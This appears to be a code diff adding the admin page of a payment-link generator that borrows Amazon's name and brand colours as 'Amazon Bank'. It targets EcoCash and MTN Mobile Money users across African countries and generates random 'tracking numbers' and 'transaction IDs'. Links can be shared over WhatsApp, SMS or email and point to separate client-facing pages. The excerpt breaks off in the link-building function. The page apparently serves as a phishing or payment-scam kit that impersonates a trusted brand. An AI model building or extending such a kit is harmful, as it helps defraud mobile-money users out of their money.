@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Amazon Bank Pay · Admin — Generate Payment Link</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    /* Amazon Brand Colors — Squid Ink + Orange */
+    --amz-squid-ink: #131921;      /* Amazon's dark nav background */
+    --amz-squid-ink-mid: #232F3E;  /* Amazon secondary dark */
+    --amz-squid-ink-soft: #333E48; /* Amazon corporate neutral */
+    --amz-orange: #FF9900;         /* Amazon primary brand orange */
+    --amz-orange-hover: #E88B00;
+    --amz-orange-light: #FFB84D;
+    --amz-orange-subtle: #FFF4E5;
+    
+    --amz-bg: #F7F8FA;
+    --amz-card: #FFFFFF;
+    --amz-text: #0F1111;           /* Amazon on-surface */
+    --amz-muted: #565959;
+    --amz-border: #E3E6E6;
+    
+    --amz-success: #067D62;
+    --amz-success-light: #E6F4F0;
+    --amz-error: #B12704;
+    --amz-error-light: #FDECEA;
+    
+    --amz-radius: 12px;
+    --amz-shadow: 0 4px 20px rgba(19,25,33,0.06);
+    --amz-shadow-lg: 0 12px 40px rgba(19,25,33,0.12);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--amz-bg); color: var(--amz-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+  }
+
+  /* ── Top bar ─────────────────────────────────── */
+  .topbar { 
+    background: var(--amz-squid-ink); 
+    padding: 0 24px; position: sticky; top: 0; z-index: 20; 
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+  }
+  .topbar-inner { max-width: 1180px; margin: 0 auto; height: 64px; display: flex; align-items: center; justify-content: space-between; }
+  .brand { display: flex; align-items: center; gap: 11px; }
+  .brand-mark { 
+    width: 40px; height: 40px; border-radius: 10px; 
+    background: linear-gradient(135deg, var(--amz-orange), var(--amz-orange-hover));
+    display: flex; align-items: center; justify-content: center; 
+    color: var(--amz-squid-ink); font-weight: 800; font-size: 15px; letter-spacing: -0.5px;
+    box-shadow: 0 2px 8px rgba(255,153,0,0.3);
+  }
+  .brand-name { font-size: 17px; font-weight: 700; letter-spacing: -0.3px; color: #FFFFFF; }
+  .brand-sub { font-size: 11px; color: rgba(255,255,255,0.55); margin-top: 1px; font-weight: 500; }
+  .badge-admin { 
+    font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; 
+    color: var(--amz-squid-ink); background: var(--amz-orange); padding: 5px 12px; border-radius: 20px;
+  }
+
+  /* ── Page ─────────────────────────────────────── */
+  .page { max-width: 1180px; margin: 0 auto; padding: 32px 24px 60px; }
+  .page-head { margin-bottom: 24px; }
+  .page-head h1 { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; color: var(--amz-squid-ink); }
+  .page-head p { font-size: 14px; color: var(--amz-muted); margin-top: 4px; }
+
+  .grid { display: grid; grid-template-columns: 1fr 420px; gap: 24px; align-items: start; }
+
+  .card { 
+    background: var(--amz-card); border-radius: var(--amz-radius); 
+    box-shadow: var(--amz-shadow); border: 1px solid var(--amz-border); 
+  }
+  .card-pad { padding: 28px; }
+  .card h2 { font-size: 16px; font-weight: 700; margin-bottom: 4px; color: var(--amz-squid-ink); }
+  .card .card-desc { font-size: 13px; color: var(--amz-muted); margin-bottom: 22px; }
+
+  /* ── Form fields ──────────────────────────────── */
+  .field { margin-bottom: 18px; }
+  .field label { display: flex; align-items: center; justify-content: space-between; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: var(--amz-squid-ink); }
+  .field label .hint { font-weight: 400; color: var(--amz-muted); font-size: 11px; }
+  .field input, .field select, .field textarea { 
+    width: 100%; padding: 11px 13px; font-size: 14px; 
+    border: 1.5px solid var(--amz-border); border-radius: 9px; 
+    background: #fff; color: var(--amz-text); outline: none; 
+    transition: border-color .15s, box-shadow .15s; font-family: inherit; 
+  }
+  .field input:focus, .field select:focus, .field textarea:focus { 
+    border-color: var(--amz-orange); 
+    box-shadow: 0 0 0 3px rgba(255,153,0,0.15); 
+  }
+  .field input::placeholder, .field textarea::placeholder { color: #A8B4C4; }
+  .field textarea { resize: vertical; min-height: 72px; }
+  .field.invalid input, .field.invalid select, .field.invalid textarea { 
+    border-color: var(--amz-error); box-shadow: 0 0 0 3px rgba(177,39,4,0.10); 
+  }
+  .err-msg { display: none; font-size: 12px; color: var(--amz-error); margin-top: 5px; font-weight: 500; }
+  .field.invalid .err-msg { display: block; }
+
+  .row { display: flex; gap: 12px; }
+  .row .field { flex: 1; margin-bottom: 0; }
+  .row .field.narrow { flex: 0 0 128px; }
+  .row + .field { margin-top: 18px; }
+
+  .input-group { display: flex; gap: 8px; }
+  .input-group input { flex: 1; font-family: "SF Mono", Monaco, monospace; letter-spacing: 0.6px; font-size: 13px; }
+  .btn-icon { 
+    flex: 0 0 46px; border: 1.5px solid var(--amz-border); border-radius: 9px; 
+    background: #fff; cursor: pointer; font-size: 17px; color: var(--amz-muted); 
+    display: flex; align-items: center; justify-content: center; transition: all .15s; 
+  }
+  .btn-icon:hover { 
+    border-color: var(--amz-orange); color: var(--amz-orange-hover); background: var(--amz-orange-subtle); 
+  }
+
+  .divider { height: 1px; background: var(--amz-border); margin: 22px 0; }
+
+  /* ── Primary button ───────────────────────────── */
+  .btn-primary { 
+    width: 100%; padding: 14px; font-size: 15px; font-weight: 700; 
+    background: var(--amz-orange); color: var(--amz-squid-ink); 
+    border: none; border-radius: 10px; cursor: pointer; margin-top: 6px; 
+    transition: filter .15s, transform .1s; font-family: inherit; 
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    box-shadow: 0 2px 8px rgba(255,153,0,0.25);
+  }
+  .btn-primary:hover { filter: brightness(1.08); }
+  .btn-primary:active { transform: scale(0.995); }
+  .btn-primary:disabled { opacity: 0.65; cursor: wait; }
+
+  /* ── Preview card ─────────────────────────────── */
+  .preview-wrap { position: sticky; top: 88px; }
+  .preview-title { 
+    font-size: 11px; font-weight: 700; color: var(--amz-muted); 
+    text-transform: uppercase; letter-spacing: 0.7px; margin-bottom: 10px; padding-left: 2px; 
+  }
+  .preview-card { 
+    background: linear-gradient(160deg, var(--amz-squid-ink) 0%, var(--amz-squid-ink-mid) 100%);
+    border-radius: 18px; padding: 22px 22px 20px; color: #fff; 
+    box-shadow: var(--amz-shadow-lg); position: relative; overflow: hidden;
+    border: 1px solid rgba(255,255,255,0.06);
+  }
+  .preview-card::after { 
+    content: ''; position: absolute; right: -60px; top: -60px; 
+    width: 180px; height: 180px; border-radius: 50%; 
+    background: radial-gradient(circle, rgba(255,153,0,0.25), transparent 70%); 
+  }
+  .pc-top { display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 1; }
+  .pc-brand { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; }
+  .pc-brand .dot { 
+    width: 22px; height: 22px; border-radius: 6px; 
+    background: var(--amz-orange); 
+    display: flex; align-items: center; justify-content: center; 
+    font-size: 9px; font-weight: 800; color: var(--amz-squid-ink);
+  }
+  .pc-status { 
+    font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; 
+    background: rgba(255,153,0,0.2); color: var(--amz-orange-light); padding: 4px 10px; border-radius: 20px;
+    border: 1px solid rgba(255,153,0,0.3);
+  }
+  .pc-amount-label { 
+    font-size: 11px; opacity: 0.6; margin-top: 22px; text-transform: uppercase; letter-spacing: 0.7px; 
+    position: relative; z-index: 1; color: rgba(255,255,255,0.7);
+  }
+  .pc-amount { 
+    font-size: 34px; font-weight: 800; letter-spacing: -1px; line-height: 1.1; margin-top: 2px; 
+    position: relative; z-index: 1; color: #FFFFFF;
+  }
+  .pc-amount .cur { font-size: 15px; font-weight: 600; opacity: 0.7; margin-left: 5px; color: var(--amz-orange-light); }
+  .pc-rows { margin-top: 20px; position: relative; z-index: 1; }
+  .pc-row { 
+    display: flex; justify-content: space-between; gap: 12px; padding: 7px 0; font-size: 12px; 
+    border-top: 1px solid rgba(255,255,255,0.08);
+  }
+  .pc-row .k { opacity: 0.55; flex-shrink: 0; }
+  .pc-row .v { font-weight: 600; text-align: right; word-break: break-word; color: rgba(255,255,255,0.95); }
+  .pc-row .v.mono { font-family: "SF Mono", Monaco, monospace; letter-spacing: 0.4px; font-size: 11px; }
+  .pc-note { 
+    margin-top: 14px; font-size: 11px; line-height: 1.5; 
+    background: rgba(255,153,0,0.10); border: 1px solid rgba(255,153,0,0.15);
+    border-radius: 9px; padding: 10px 12px; position: relative; z-index: 1; 
+  }
+  .pc-note .k { font-size: 9px; opacity: 0.6; text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 3px; color: var(--amz-orange-light); }
+  .pc-empty { opacity: 0.5; font-size: 12px; text-align: center; padding: 20px 0 4px; position: relative; z-index: 1; }
+
+  /* ── Result panel ─────────────────────────────── */
+  .result { 
+    margin-top: 22px; padding: 18px; border-radius: 12px; 
+    background: var(--amz-orange-subtle); 
+    border: 1.5px dashed var(--amz-orange); display: none; 
+  }
+  .result.show { display: block; animation: fadeIn .25s ease; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: none; } }
+  .result .res-label { 
+    font-size: 11px; font-weight: 800; color: var(--amz-squid-ink); 
+    text-transform: uppercase; letter-spacing: 0.6px; 
+    display: flex; align-items: center; justify-content: space-between; gap: 10px; 
+  }
+  .res-label .short-code { 
+    font-family: "SF Mono", Monaco, monospace; font-size: 11px; 
+    background: var(--amz-squid-ink); color: var(--amz-orange); 
+    padding: 3px 9px; border-radius: 6px; letter-spacing: 0.5px; font-weight: 700; text-transform: none; 
+  }
+  .res-linkbox { display: flex; gap: 8px; margin-top: 10px; }
+  .res-linkbox input { 
+    flex: 1; padding: 10px 12px; font-size: 12px; 
+    border: 1.5px solid var(--amz-border); border-radius: 8px; 
+    background: #fff; font-family: "SF Mono", Monaco, monospace; 
+    color: var(--amz-text); min-width: 0; 
+  }
+  .res-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
+  .btn-action { 
+    padding: 11px 12px; font-size: 13px; font-weight: 700; border-radius: 9px; 
+    cursor: pointer; font-family: inherit; display: flex; align-items: center; justify-content: center; 
+    gap: 7px; transition: filter .15s, background .15s, transform .1s; border: none; 
+  }
+  .btn-action:active { transform: scale(0.98); }
+  .btn-copy { background: var(--amz-squid-ink); color: var(--amz-orange); }
+  .btn-copy:hover { filter: brightness(1.2); }
+  .btn-copy.copied { background: var(--amz-success); color: #fff; }
+  .btn-share { background: #fff; color: var(--amz-squid-ink); border: 1.5px solid var(--amz-squid-ink); }
+  .btn-share:hover { background: var(--amz-squid-ink); color: var(--amz-orange); }
+
+  /* ── Share popup ──────────────────────────────── */
+  .share-pop { 
+    display: none; margin-top: 10px; padding: 12px; 
+    background: #fff; border: 1.5px solid var(--amz-border); 
+    border-radius: 10px; animation: fadeIn .2s ease; 
+  }
+  .share-pop.show { display: block; }
+  .share-pop .sp-title { 
+    font-size: 10px; font-weight: 700; color: var(--amz-muted); 
+    text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px; 
+  }
+  .share-options { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
+  .share-opt { 
+    display: flex; flex-direction: column; align-items: center; gap: 6px; 
+    padding: 10px 4px; border-radius: 9px; cursor: pointer; 
+    border: 1.5px solid var(--amz-border); background: #fff; 
+    transition: all .15s; font-family: inherit; 
+  }
+  .share-opt:hover { border-color: var(--amz-orange); background: var(--amz-orange-subtle); }
+  .share-opt .ic { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 15px; color: #fff; }
+  .share-opt .lbl { font-size: 10px; font-weight: 600; color: var(--amz-text); }
+  .ic-wa { background: #25D366; }
+  .ic-sms { background: #34A853; }
+  .ic-mail { background: #EA4335; }
+  .ic-copy { background: var(--amz-squid-ink); }
+
+  /* ── Link mode toggle ─────────────────────────── */
+  .link-mode { 
+    display: flex; gap: 6px; margin-top: 12px; 
+    background: #fff; padding: 4px; border-radius: 9px; 
+    border: 1.5px solid var(--amz-border); 
+  }
+  .link-mode button { 
+    flex: 1; padding: 7px 10px; font-size: 11px; font-weight: 600; 
+    border: none; border-radius: 6px; background: transparent; 
+    color: var(--amz-muted); cursor: pointer; font-family: inherit; transition: all .15s; 
+  }
+  .link-mode button.active { background: var(--amz-squid-ink); color: var(--amz-orange); }
+
+  /* ── Result meta + QR ─────────────────────────── */
+  .res-meta { 
+    display: flex; justify-content: space-between; align-items: center; 
+    margin-top: 12px; font-size: 11px; color: var(--amz-muted); flex-wrap: wrap; gap: 6px; 
+  }
+  .res-meta a { color: var(--amz-squid-ink); font-weight: 600; text-decoration: none; border-bottom: 1px solid var(--amz-orange); }
+  .res-meta a:hover { color: var(--amz-orange-hover); }
+  .qr-box { 
+    margin-top: 12px; display: flex; align-items: center; gap: 14px; 
+    padding: 12px; background: #fff; border: 1.5px solid var(--amz-border); border-radius: 10px; 
+  }
+  .qr-box img { width: 78px; height: 78px; border-radius: 6px; }
+  .qr-box .qr-txt { font-size: 11px; color: var(--amz-muted); line-height: 1.5; }
+  .qr-box .qr-txt strong { color: var(--amz-squid-ink); display: block; font-size: 12px; margin-bottom: 2px; }
+
+  /* ── Toggle switch ────────────────────────────── */
+  .toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; }
+  .toggle-row .tl { font-size: 13px; font-weight: 600; color: var(--amz-squid-ink); }
+  .toggle-row .ts { font-size: 11px; color: var(--amz-muted); margin-top: 2px; }
+  .switch { position: relative; width: 44px; height: 24px; flex-shrink: 0; }
+  .switch input { opacity: 0; width: 0; height: 0; }
+  .slider { position: absolute; inset: 0; background: #CBD5E1; border-radius: 24px; cursor: pointer; transition: background .2s; }
+  .slider::before { 
+    content: ''; position: absolute; width: 18px; height: 18px; left: 3px; top: 3px; 
+    background: #fff; border-radius: 50%; transition: transform .2s; 
+    box-shadow: 0 1px 3px rgba(0,0,0,0.2); 
+  }
+  .switch input:checked + .slider { background: var(--amz-orange); }
+  .switch input:checked + .slider::before { transform: translateX(20px); }
+
+  /* ── Toast ────────────────────────────────────── */
+  .toast { 
+    position: fixed; bottom: 24px; left: 50%; 
+    transform: translateX(-50%) translateY(80px); 
+    background: var(--amz-squid-ink); color: var(--amz-orange); 
+    padding: 12px 20px; border-radius: 10px; font-size: 13px; font-weight: 600; 
+    box-shadow: var(--amz-shadow-lg); opacity: 0; 
+    transition: all .3s ease; z-index: 100; pointer-events: none; 
+    border: 1px solid rgba(255,153,0,0.2);
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  @media (max-width: 960px) {
+    .grid { grid-template-columns: 1fr; }
+    .preview-wrap { position: static; order: -1; }
+  }
+  @media (max-width: 560px) {
+    .page { padding: 20px 14px 40px; }
+    .card-pad { padding: 22px 18px; }
+    .topbar { padding: 0 14px; }
+    .badge-admin { display: none; }
+    .row { flex-direction: column; gap: 0; }
+    .row .field { margin-bottom: 18px; }
+    .row .field.narrow { flex: 1; }
+    .page-head h1 { font-size: 20px; }
+    .pc-amount { font-size: 28px; }
+    .res-actions { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">
+      <div class="brand-mark">AB</div>
+      <div>
+        <div class="brand-name">Amazon Bank</div>
+        <div class="brand-sub">Payment link generator</div>
+      </div>
+    </div>
+    <span class="badge-admin">Admin</span>
+  </div>
+</header>
+
+<main class="page">
+  <div class="page-head">
+    <h1>Generate a client payment link</h1>
+    <p>Fill in the payment details. A short link, QR code and share options will be created.</p>
+  </div>
+
+  <div class="grid">
+    <section class="card card-pad">
+      <h2>Payment details</h2>
+      <p class="card-desc">All fields are required unless marked optional.</p>
+
+      <form id="payForm" novalidate onsubmit="handleSubmit(event)">
+        <div class="row">
+          <div class="field" id="f-country">
+            <label>Country</label>
+            <select id="country" required>
+              <option value="">Select country</option>
+              <optgroup label="EcoCash">
+                <option>Zimbabwe</option>
+                <option>South Africa</option>
+                <option>Zambia</option>
+                <option>Botswana</option>
+                <option>Kenya</option>
+                <option>Malawi</option>
+                <option>Rwanda</option>
+                <option>DR Congo</option>
+                <option>Ghana</option>
+                <option>Lesotho</option>
+                <option>Uganda</option>
+                <option>China (Alipay)</option>
+              </optgroup>
+              <optgroup label="MTN Mobile Money">
+                <option>Benin</option>
+                <option>Cameroon</option>
+                <option>Côte d'Ivoire</option>
+                <option>Congo</option>
+                <option>Eswatini</option>
+                <option>Ghana (MTN)</option>
+                <option>Liberia</option>
+                <option>Rwanda (MTN)</option>
+                <option>Uganda (MTN)</option>
+                <option>Zambia (MTN)</option>
+              </optgroup>
+            </select>
+            <div class="err-msg">Please select a country.</div>
+          </div>
+          <div class="field" id="f-market">
+            <label>Marketed / Market</label>
+            <input type="text" id="market" placeholder="e.g. Zimbabwe Urban, Diaspora" autocomplete="off" required>
+            <div class="err-msg">Please enter the market / marketed region.</div>
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="field" id="f-mode">
+            <label>Payment mode <span class="hint">editable</span></label>
+            <input type="text" id="paymentMode" list="modeList" placeholder="Select or type a mode" autocomplete="off" required>
+            <datalist id="modeList">
+              <option value="EcoCash Wallet Transfer">
+              <option value="Merchant Code Payment">
+              <option value="EcoCash App Payment">
+              <option value="USSD *151# Payment">
+              <option value="QR Scan & Pay">
+              <option value="MTN Mobile Money">
+              <option value="MTN MoMo Wallet Transfer">
+              <option value="MTN Merchant Payment">
+            </datalist>
+            <div class="err-msg">Please enter a payment mode.</div>
+          </div>
+          <div class="field" id="f-service">
+            <label>Service name</label>
+            <input type="text" id="serviceName" placeholder="e.g. Consulting, Airtime, School Fees" autocomplete="off" required>
+            <div class="err-msg">Please enter the service name.</div>
+          </div>
+        </div>
+
+        <div class="field" id="f-recipient">
+          <label>Recipient account name</label>
+          <input type="text" id="recipientName" placeholder="e.g. Tendai Moyo" autocomplete="off" required>
+          <div class="err-msg">Please enter the recipient name.</div>
+        </div>
+
+        <div class="row">
+          <div class="field" id="f-tracking">
+            <label>Tracking number <span class="hint">auto-generated</span></label>
+            <div class="input-group">
+              <input type="text" id="trackingNumber" placeholder="ABXXXXXXXX" maxlength="14" autocomplete="off" required>
+              <button type="button" class="btn-icon" onclick="regenerateTracking()" title="Generate new tracking number">↻</button>
+            </div>
+            <div class="err-msg">Tracking number is required.</div>
+          </div>
+          <div class="field" id="f-txn">
+            <label>Transaction ID <span class="hint">auto / editable</span></label>
+            <div class="input-group">
+              <input type="text" id="transactionId" placeholder="TXN-XXXXXXXX" maxlength="20" autocomplete="off" required>
+              <button type="button" class="btn-icon" onclick="regenerateTxn()" title="Generate new transaction ID">↻</button>
+            </div>
+            <div class="err-msg">Transaction ID is required.</div>
+          </div>
+        </div>
+
+        <div class="field" id="f-account">
+          <label>Account number</label>
+          <input type="text" id="accountNumber" placeholder="e.g. 0771234567 or merchant code" autocomplete="off" required>
+          <div class="err-msg">Please enter the account number.</div>
+        </div>
+
+        <div class="row">
+          <div class="field" id="f-amount">
+            <label>Amount</label>
+            <input type="number" id="amount" step="0.01" min="0.01" placeholder="0.00" autocomplete="off" required>
+            <div class="err-msg">Enter a valid amount greater than 0.</div>
+          </div>
+          <div class="field narrow" id="f-currency">
+            <label>Currency</label>
+            <select id="currency" required>
+              <optgroup label="EcoCash">
+                <option value="USD">USD</option>
+                <option value="ZiG">ZiG</option>
+                <option value="ZAR">ZAR</option>
+                <option value="KES">KES</option>
+                <option value="BWP">BWP</option>
+                <option value="MWK">MWK</option>
+                <option value="RWF">RWF</option>
+              </optgroup>
+              <optgroup label="MTN Mobile Money">
+                <option value="XAF">XAF</option>
+                <option value="XOF">XOF</option>
+                <option value="ZMW">ZMW</option>
+                <option value="UGX">UGX</option>
+                <option value="GHS">GHS</option>
+                <option value="SZL">SZL</option>
+                <option value="LRD">LRD</option>
+              </optgroup>
+            </select>
+            <div class="err-msg">Select currency.</div>
+          </div>
+        </div>
+
+        <div class="field" id="f-note">
+          <label>Receipt / Service note</label>
+          <textarea id="serviceNote" placeholder="e.g. Payment for invoice #INV-2024-001 — consulting services" required></textarea>
+          <div class="err-msg">Please add a short note for the client.</div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="toggle-row">
+          <div>
+            <div class="tl">Set link expiry</div>
+            <div class="ts">Optional — expires after the chosen time</div>
+          </div>
+          <label class="switch">
+            <input type="checkbox" id="expiryToggle" onchange="onExpiryToggle()">
+            <span class="slider"></span>
+          </label>
+        </div>
+
+        <div class="field" id="f-expiry" style="display:none; margin-top:8px;">
+          <label>Expires in</label>
+          <select id="expiryDuration">
+            <option value="1">1 hour</option>
+            <option value="24" selected>24 hours</option>
+            <option value="72">3 days</option>
+            <option value="168">7 days</option>
+          </select>
+        </div>
+
+        <button type="submit" class="btn-primary" id="submitBtn">
+          <span>Generate client link</span>
+          <span>→</span>
+        </button>
+      </form>
+
+      <div class="result" id="result">
+        <div class="res-label">
+          <span>✓ Link ready</span>
+          <span class="short-code" id="shortCode">—</span>
+        </div>
+        <div class="res-linkbox">
+          <input type="text" id="generatedLink" readonly onclick="this.select()">
+        </div>
+        <div class="res-actions">
+          <button type="button" class="btn-action btn-copy" id="copyBtn" onclick="copyLink()">
+            <span>📋</span> Copy link
+          </button>
+          <button type="button" class="btn-action btn-share" onclick="toggleSharePop()">
+            <span>↗</span> Share
+          </button>
+        </div>
+        <div class="share-pop" id="sharePop">
+          <div class="sp-title">Share this payment link via</div>
+          <div class="share-options">
+            <button type="button" class="share-opt" onclick="shareVia('whatsapp')">
+              <span class="ic ic-wa">💬</span><span class="lbl">WhatsApp</span>
+            </button>
+            <button type="button" class="share-opt" onclick="shareVia('sms')">
+              <span class="ic ic-sms">✉</span><span class="lbl">SMS</span>
+            </button>
+            <button type="button" class="share-opt" onclick="shareVia('email')">
+              <span class="ic ic-mail">@</span><span class="lbl">Email</span>
+            </button>
+            <button type="button" class="share-opt" onclick="shareVia('native')">
+              <span class="ic ic-copy">⋯</span><span class="lbl">More</span>
+            </button>
+          </div>
+        </div>
+        <div class="link-mode">
+          <button type="button" id="modeShort" class="active" onclick="setLinkMode('short')">Short link</button>
+          <button type="button" id="modeFull" onclick="setLinkMode('full')">Full link</button>
+        </div>
+        <div class="res-meta">
+          <span id="expiryInfo"></span>
+          <a href="#" id="openLink" target="_blank" rel="noopener">Open preview →</a>
+        </div>
+        <div class="qr-box" id="qrBox">
+          <img id="qrImg" alt="QR code">
+          <div class="qr-txt">
+            <strong>Scan to open</strong>
+            Client can scan this QR code to open the payment page directly.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <aside class="preview-wrap">
+      <div class="preview-title">Live client preview</div>
+      <div class="preview-card">
+        <div class="pc-top">
+          <div class="pc-brand"><span class="dot">AB</span> Amazon Bank</div>
+          <span class="pc-status">Payment request</span>
+        </div>
+        <div class="pc-amount-label">Amount to pay</div>
+        <div class="pc-amount">
+          <span id="pvAmount">0.00</span><span class="cur" id="pvCurrency">USD</span>
+        </div>
+        <div class="pc-rows" id="pvRows">
+          <div class="pc-row"><span class="k">Service</span><span class="v" id="pvService">—</span></div>
+          <div class="pc-row"><span class="k">Recipient</span><span class="v" id="pvRecipient">—</span></div>
+          <div class="pc-row"><span class="k">Tracking</span><span class="v mono" id="pvTracking">—</span></div>
+          <div class="pc-row"><span class="k">Transaction ID</span><span class="v mono" id="pvTxn">—</span></div>
+          <div class="pc-row"><span class="k">Account</span><span class="v mono" id="pvAccount">—</span></div>
+          <div class="pc-row"><span class="k">Country</span><span class="v" id="pvCountry">—</span></div>
+          <div class="pc-row"><span class="k">Marketed</span><span class="v" id="pvMarket">—</span></div>
+          <div class="pc-row"><span class="k">Mode</span><span class="v" id="pvMode">—</span></div>
+        </div>
+        <div class="pc-note" id="pvNote" style="display:none;">
+          <div class="k">Receipt / Service note</div>
+          <div id="pvNoteText"></div>
+        </div>
+        <div class="pc-empty" id="pvEmpty">Fill the form to see a live preview…</div>
+      </div>
+    </aside>
+  </div>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const $ = id => document.getElementById(id);
+const state = { fullLink: '', shortLink: '', shortCode: '', linkMode: 'short', payload: null };
+
+const MTN_COUNTRIES = [
+  'Benin', 'Cameroon', "Côte d'Ivoire", 'Congo', 'Eswatini',
+  'Ghana (MTN)', 'Liberia', 'Rwanda (MTN)', 'Uganda (MTN)', 'Zambia (MTN)'
+];
+
+function targetPageFor(country) {
+  return MTN_COUNTRIES.includes(String(country || '')) ? 'mtn.html' : 'client.html';
+}
+
+const COUNTRY_CURRENCY = {
+  'Zimbabwe': 'USD', 'South Africa': 'ZAR', 'Zambia': 'ZMW',
+  'Botswana': 'BWP', 'Kenya': 'KES', 'Malawi': 'MWK', 'Rwanda': 'RWF',
+  'DR Congo': 'USD', 'Ghana': 'GHS', 'Lesotho': 'ZAR', 'Uganda': 'UGX',
+  'China (Alipay)': 'USD',
+  'Benin': 'XOF', 'Cameroon': 'XAF', "Côte d'Ivoire": 'XOF', 'Congo': 'XAF',
+  'Eswatini': 'SZL', 'Ghana (MTN)': 'GHS', 'Liberia': 'LRD',
+  'Rwanda (MTN)': 'RWF', 'Uganda (MTN)': 'UGX', 'Zambia (MTN)': 'ZMW'
+};
+
+function showToast(msg) {
+  const t = $('toast'); t.textContent = msg; t.classList.add('show');
+  clearTimeout(t._timer); t._timer = setTimeout(() => t.classList.remove('show'), 2200);
+}
+function randChars(n) {
+  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; let s = '';
+  for (let i = 0; i < n; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
+  return s;
+}
+function generateTrackingNumber() { return 'AB' + randChars(8); }
+function generateTxnId() { return 'TXN-' + randChars(8); }
+
+function regenerateTracking() { $('trackingNumber').value = generateTrackingNumber(); clearInvalid('f-tracking'); updatePreview(); }
+function regenerateTxn() { $('transactionId').value = generateTxnId(); clearInvalid('f-txn'); updatePreview(); }
+
+function applyCountryCurrency() {
+  const c = $('country').value;
+  const cur = COUNTRY_CURRENCY[c];
+  if (cur) {
+    const sel = $('currency');
+    for (let i = 0; i < sel.options.length; i++) {
+      if (sel.options[i].value === cur) { sel.selectedIndex = i; break; }
+    }
+  }
+}
+
+function updatePreview() {
+  const amt = $('amount').value; const cur = $('currency').value;
+  $('pvAmount').textContent = amt ? Number(amt).toFixed(2) : '0.00';
+  $('pvCurrency').textContent = cur;
+  $('pvService').textContent = $('serviceName').value.trim() || '—';
+  $('pvRecipient').textContent = $('recipientName').value.trim() || '—';
+  $('pvTracking').textContent = $('trackingNumber').value.trim() || '—';
+  $('pvTxn').textContent = $('transactionId').value.trim() || '—';
+  $('pvAccount').textContent = $('accountNumber').value.trim() || '—';
+  $('pvCountry').textContent = $('country').value || '—';
+  $('pvMarket').textContent = $('market').value.trim() || '—';
+  $('pvMode').textContent = $('paymentMode').value.trim() || '—';
+  const note = $('serviceNote').value.trim();
+  const anyData = $('serviceName').value || $('recipientName').value || $('trackingNumber').value ||
+                  $('transactionId').value || $('accountNumber').value || amt || $('country').value ||
+                  $('market').value || $('paymentMode').value || note;
+  $('pvEmpty').style.display = anyData ? 'none' : 'block';
+  $('pvRows').style.display = anyData ? 'block' : 'none';
+  if (note) { $('pvNote').style.display = 'block'; $('pvNoteText').textContent = note; }
+  else { $('pvNote').style.display = 'none'; }
+}
+
+['amount','currency','recipientName','trackingNumber','transactionId','accountNumber',
+ 'country','market','paymentMode','serviceName','serviceNote'].forEach(id => {
+  document.addEventListener('DOMContentLoaded', () => {
+    const el = $(id);
+    if (el) {
+      el.addEventListener('input', updatePreview);
+      el.addEventListener('change', updatePreview);
+    }
+  });
+});
+
+$('country').addEventListener('change', () => {
+  applyCountryCurrency();
+  updatePreview();
+});
+
+function setInvalid(fid) { $(fid).classList.add('invalid'); }
+function clearInvalid(fid) { $(fid).classList.remove('invalid'); }
+function clearAllInvalid() { document.querySelectorAll('.field.invalid').forEach(el => el.classList.remove('invalid')); }
+
+function validateForm() {
+  clearAllInvalid(); let ok = true;
+  if (!$('country').value) { setInvalid('f-country'); ok = false; }
+  if (!$('market').value.trim()) { setInvalid('f-market'); ok = false; }
+  if (!$('paymentMode').value.trim()) { setInvalid('f-mode'); ok = false; }
+  if (!$('serviceName').value.trim()) { setInvalid('f-service'); ok = false; }
+  if (!$('recipientName').value.trim()) { setInvalid('f-recipient'); ok = false; }
+  if (!$('trackingNumber').value.trim()) { setInvalid('f-tracking'); ok = false; }
+  if (!$('transactionId').value.trim()) { setInvalid('f-txn'); ok = false; }
+  if (!$('accountNumber').value.trim()) { setInvalid('f-account'); ok = false; }
+  const amt = parseFloat($('amount').value); if (!amt || amt <= 0) { setInvalid('f-amount'); ok = false; }
+  if (!$('serviceNote').value.trim()) { setInvalid('f-note'); ok = false; }
+  return ok;
+}
+
+function onExpiryToggle() { $('f-expiry').style.display = $('expiryToggle').checked ? 'block' : 'none'; }
+
+function b64urlEncode(str) {
+  return btoa(unescape(encodeURIComponent(str))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+async function buildLinks(payload) {
+  const base = window.location.href.replace(/[^/]*$/, '');
+  const page = targetPageFor(payload.c);
+  const encoded = b64urlEncode(JSON.stringify(payload));
+  state.fullLink = base + page + '?d=' + encoded;
+
